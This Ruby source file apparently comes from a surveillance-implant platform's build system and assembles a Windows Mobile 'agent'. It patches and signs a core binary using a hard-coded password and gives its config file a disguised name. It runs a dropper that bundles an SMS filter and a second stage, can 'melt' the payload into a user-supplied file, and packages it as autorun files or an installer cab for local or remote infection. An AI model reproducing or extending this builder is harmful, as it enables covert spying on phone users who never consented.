#
#  Agent creation for winMo
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWinMo < Build

  def initialize
    super
    @platform = 'winmo'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :winmo, params['demo']

    # invoke the generic patch method with the new params
    super

    # sign the core after the binary patch
    CrossPlatform.exec path('signtool'), "sign /P password /f #{path('pfx')} #{path('core')}"

  end

  def scramble
    trace :debug, "Build: scrambling"

    @scrambled = {config: 'cptm511.dql'}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'

    # use the user-provided file to melt with,
    # but the actual melt will be performed later in the pack method
    if params['input']
      FileUtils.mv Config.instance.temp(params['input']), path('user')
    end

    CrossPlatform.exec path('dropper'), path('core')+' '+
                                        path('smsfilter')+' '+
                                        path('secondstage')+' '+
                                        path(@scrambled[:config])+' '+
                                        path('cer')+' '+
                                        path('pfx')+' '+
                                        path('output')

    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    File.rename(path('firststage'), path('autorun.exe'))
    File.rename(path('output'), path('autorun.zoo'))

    # if the file 'user' is present, we need to include it in the cab
    # the file was saved during the melt phase
    if File.exist? path('user')
      FileUtils.cp_r(path('custom/.'), path('.'))
    else
      FileUtils.cp_r(path('new/.'), path(''))
    end

    CrossPlatform.exec path('cabwiz'), path('rcs.inf').gsub("/", '\\') + ' /compress'

    File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
    File.rename path('rcs.cab'), path(@appname + '.cab')

    @outputs = ['autorun.zoo', 'autorun.exe', @appname + '.cab']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    case params['type']
      when 'local'
        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
          z.file.open('autorun.exe', "wb") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
          z.file.open('autorun.zoo', "wb") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
        end
        # this is the only file we need to output after this point
        @outputs = ['output.zip']

      when 'remote'
        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
          z.file.open(@appname + '.cab', "wb") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
        end
        # this is the only file we need to output after this point
        @outputs = ['output.zip']
    end
  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      z.file.open('core', "wb") { |f| f.write core_content }
    end
  end

end

end #DB::
end #RCS::
